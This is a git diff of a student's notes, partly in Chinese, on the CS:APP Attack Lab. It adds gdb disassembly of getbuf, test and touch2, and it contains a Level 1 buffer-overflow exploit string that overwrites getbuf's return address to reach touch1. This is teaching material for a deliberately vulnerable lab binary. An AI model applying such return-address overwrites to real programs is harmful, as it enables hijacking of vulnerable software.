@@ -1,4 +1,6 @@
 ## Prenote
+https://github.com/kechenkristin/csapp/blob/main/labs/attacklab/%E8%AE%B2%E4%B9%89.pdf
+
 ### Files
 ```shell
 kristin@kristin-PC:~/study/csapp/labs/attacklab/target1$ ls
@@ -23,11 +25,11 @@ unsigned getbuf() {
 ```
 
 ### 过程调用的栈帧结构
-![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p4.jpg)
+![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p4.png)
 
 ## Level1
 ### instruction
-- tips from pdf
+- tips from pdf  
 • All the information you need to devise your exploit string for this level can be determined by exam-ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.  
 • The idea is to position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1.  
 • Be careful about byte ordering.  
@@ -82,7 +84,7 @@ Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
    0x0000000000401971 <+9>:	call   0x4017a8 <getbuf>
-   0x0000000000401976 <+14>:	mov    %eax,%edx
+   0x0000000000401976 <+14>:	mov    %eax,%edx	// test调用完getbuf后正常的返回地址应该是0x0000000000401976
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
@@ -107,16 +109,18 @@ unsigned getbuf() {
 ```
 
 ```asm
-00000000004017a8 <getbuf>:
-  4017a8:       48 83 ec 28             sub    $0x28,%rsp
-  4017ac:       48 89 e7                mov    %rsp,%rdi
-  4017af:       e8 8c 02 00 00          call   401a40 <Gets>
-  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
-  4017b9:       48 83 c4 28             add    $0x28,%rsp
-  4017bd:       c3                      ret
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
+   0x00000000004017ac <+4>:	mov    %rsp,%rdi	// Gets函数调用指令之前的一条指令的地址
+   0x00000000004017af <+7>:	call   0x401a40 <Gets>
+   0x00000000004017b4 <+12>:	mov    $0x1,%eax	// Gets函数指令之后的下一条指令的地址
+   0x00000000004017b9 <+17>:	add    $0x28,%rsp
+   0x00000000004017bd <+21>:	ret    
+End of assembler dump.
 ```
 
-![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p3.jpg)
+![avatar](https://github.com/kechenkristin/imagesGitHub/blob/main/notes/csapp/l3t1p3.png)
 
 
 ### getbuf的栈帧结构
@@ -139,4 +143,31 @@ unsigned getbuf() {
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 c0 17 40 00 00 00 00 00
+```
+
+## touch2
+```asm
+(gdb) disas touch2
+Dump of assembler code for function touch2:
+   0x00000000004017ec <+0>:	sub    $0x8,%rsp
+   0x00000000004017f0 <+4>:	mov    %edi,%edx
+   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
+   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
+   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
+   0x0000000000401809 <+29>:	mov    $0x1,%edi
+   0x000000000040180e <+34>:	mov    $0x0,%eax
+   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
+   0x0000000000401818 <+44>:	mov    $0x2,%edi
+   0x000000000040181d <+49>:	call   0x401c8d <validate>
+   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
+   0x0000000000401824 <+56>:	mov    $0x403110,%esi
+   0x0000000000401829 <+61>:	mov    $0x1,%edi
+   0x000000000040182e <+66>:	mov    $0x0,%eax
+   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
+   0x0000000000401838 <+76>:	mov    $0x2,%edi
+   0x000000000040183d <+81>:	call   0x401d4f <fail>
+   0x0000000000401842 <+86>:	mov    $0x0,%edi
+   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
+End of assembler dump.
 ```
